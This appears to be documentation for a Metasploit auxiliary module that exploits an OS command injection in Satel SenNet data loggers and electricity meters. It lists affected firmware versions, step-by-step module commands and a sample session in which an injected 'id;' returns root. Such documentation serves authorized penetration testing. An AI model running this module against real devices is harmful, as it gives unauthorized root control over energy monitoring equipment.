This module exploits an OS Command Injection vulnerability in Satel SenNet Data Logger and Electricity Meters to perform arbitrary command execution as 'root'.

The following versions of SenNet Data Logger and Electricity Meters, monitoring platforms, are affected:
1. SenNet Optimal DataLogger V5.37c-1.43c and prior,
2. SenNet Solar Datalogger V5.03-1.56a and prior, and
3. SenNet Multitask Meter V5.21a-1.18b and prior.

## Verification Steps

1. Do: ```use auxiliary/scanner/telnet/satel_cmd_exec```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: ```run```

## Scenarios

  ```
msf > use auxiliary/scanner/telnet/satel_cmd_exec
msf auxiliary(satel_cmd_exec) > set rhosts 1.3.3.7
msf auxiliary(satel_cmd_exec) > run

[*] 1.3.3.7:5000   - Sending command now - id;
[+] 1.3.3.7:5000   - uid=0(root) gid=0(root)
[+] 1.3.3.7:5000   - File saved in: /root/.msf4/loot/20000000000003_1.3.3.7_cmdexeclog_12345.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

  ```
